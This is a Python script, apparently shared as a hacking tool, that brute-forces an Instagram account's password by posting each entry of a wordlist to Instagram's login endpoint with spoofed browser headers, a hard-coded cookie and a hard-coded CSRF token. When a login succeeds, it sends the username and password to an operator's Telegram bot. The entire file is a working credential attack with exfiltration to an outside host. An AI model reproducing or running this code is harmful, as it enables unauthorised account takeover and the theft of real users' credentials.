import requests
import random
from user_agent import generate_user_agent
import pyfiglet

Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\x1b[38;5;208m'  # برتقالي
Y = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابیض
a21 = '\x1b[38;5;136m'  # أصفر داكن
a13 = '\x1b[38;5;7m'  # فضي
a12 = '\x1b[38;5;220m'  # ذهبي
a17 = '\x1b[38;5;22m'  # أخضر داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a40 = '\x1b[1;94m'  # أزرق سماوي
logo = pyfiglet.figlet_format(' #*Feras*# ')
print(X + logo)
print(C)
ID = input('Enter your ID: ')
print(a16)
token = input('Enter your token bot: ')
print(a12)
r = requests.Session()

file = input('Enter name of lista : ')

with open(file, 'r') as rfile:
    
    us = input('Enter username : ')
    while True:
        username = us
        password = rfile.readline().strip()

        url = 'https://www.instagram.com/accounts/login/ajax/'

        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US, en;q=0.9, ar;q=0.8',
            'content-length': '269',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24; ig_nrcb=1; csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8; mid=YGwlfgALAAEryeSgDseYghX2LAC-',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': generate_user_agent(),
            'x-csrftoken': 'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-instagram-ajax': '8a8118fa7d40',
            'x-requested-with': 'XMLHttpRequest'
        }

        data = {
            'username': username,
            'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }

        req_login = r.post(url, headers=headers, data=data, proxies=None)
        if 'userId' in req_login.text:
            print(C + 'Username: ' + username)
            print(A + 'Password: ' + password)
            tlg = (
                f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=  • 𝑯𝒆𝒍𝒍𝒐 - 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎'
                f'\n- 𝑷𝑯 ➪ {username} ✓\n- 𝑷𝑺 ➪ {password} \n━━━━━━━━━━━━━\n• 𝐅𝐫𝐎𝐦: @XS5_S -K- @XS5_S')
            i = requests.post(tlg)
        else:
            print(Z + 'Error: ' + password)
            print(F + '_ ' * 10)
